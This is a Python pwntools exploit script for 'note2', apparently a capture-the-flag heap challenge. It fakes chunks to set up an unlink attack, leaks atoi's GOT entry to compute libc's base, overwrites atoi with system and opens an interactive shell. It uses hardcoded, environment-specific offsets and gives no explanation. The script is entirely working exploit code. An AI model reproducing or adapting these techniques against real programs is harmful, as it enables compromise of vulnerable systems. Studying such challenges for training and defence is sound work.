from pwn import *

p = process('./note2')
context.log_level = 'debug'
elf = ELF('note2')
libc = ELF('libc.so')

def create(size,content) :
    p.recvuntil('option--->>\n')
    p.sendline('1')
    sleep(0.1)
    p.sendline(str(size))
    sleep(0.1)
    p.sendline(content)

def show(id_name) :
    p.recvuntil('option--->>\n')
    p.sendline('2')
    p.sendlineafter('Input the id of the note:\n',str(id_name))

def edit(id_name,choice,newcontent) :
    p.recvuntil('option--->>\n')
    p.sendline('3')
    sleep(0.1)
    p.sendline(str(id_name))
    sleep(0.1)
    p.sendline(str(choice))
    p.sendlineafter('TheNewContents:',newcontent)

def delete(id_name) :
    p.recvuntil('option--->>\n')
    p.sendline('4')
    sleep(0.1)
    p.sendline(str(id_name))

def quit() :
    p.recvuntil('option--->>\n')
    p.sendline('5')

p.sendlineafter('Input your name:\n','AAAAAAAA')
p.sendlineafter('Input your address:\n','AAAAAAAA')

#create three chunks
payload = 'A'*8 + p64(0xa1) + p64(0x602120 - 0x18)
payload += p64(0x602120 - 0x10)
create(128,payload)
create(0,'AAAAAAAA')
#gdb.attach(p)
create(128,'AAAAAAAA')

#fake
delete(1)
payload2 = 'A'*16 + p64(0xa0) + p64(0x90) + p64(0x0)*2
create(0,payload2)
sleep(0.1)
delete(2)

#leak system
atoi_addr = elf.got['atoi']
print hex(atoi_addr)
payload3 = 'A'*24 + p64(atoi_addr)
edit(0,1,payload3)
show(0)
p.recvuntil('\x69\x73\x20')
data = u64(p.recv(6).ljust(8,'\x00'))
print hex(data)

#database
database = data - libc.symbols['atoi']
system_addr = libc.symbols['system'] + database + 0x3380
bin_addr = database + libc.search('/bin/sh').next() + 0x2b0d7
print hex(system_addr),hex(bin_addr)

#atoi --> system
payload4 = p64(system_addr)
#gdb.attach(p)
edit(0,1,payload4)

p.interactive()
